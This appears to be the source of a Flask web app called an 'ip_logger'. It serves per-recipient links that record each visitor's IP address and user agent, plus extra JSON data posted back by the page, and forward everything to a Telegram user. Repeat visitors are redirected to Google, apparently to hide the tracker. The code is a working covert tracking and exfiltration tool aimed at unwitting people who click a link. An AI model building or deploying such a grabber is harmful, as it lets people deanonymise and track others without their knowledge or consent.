import time
from typing import Dict

from flask import Blueprint, request, render_template, redirect

from app.logger.utilities import LoggerLog

ips: Dict[str, LoggerLog] = dict()

bp = Blueprint(
    "ip_logger",
    __name__,
    template_folder="../../templates"
)


@bp.route("/<int:tg_user_id>")
def logger(tg_user_id: int):
    ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)

    if ips.get(ip) is None:
        ips[ip] = LoggerLog(ip_address=ip, receiver_tg_id=tg_user_id, user_agent=request.user_agent.string)

    elif time.time() - ips[ip].last_response <= 60:
        return redirect("https://google.com")
    else:
        ips[ip].last_response = time.time()
        ips[ip].receiver_tg_id = tg_user_id

    ips[ip].last_response = time.time()
    ips[ip].send_message(ips[ip].get_main_log())

    return render_template("index.html")


@bp.route("/addlog", methods=['POST'])
def add_log():
    ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)

    if time.time() - ips[ip].last_response >= 3:
        return "fuck u"

    new_data = request.get_json()
    ips[ip].data.update(new_data)
    ips[ip].send_message(ips[ip].get_second_log())
    return "ok"
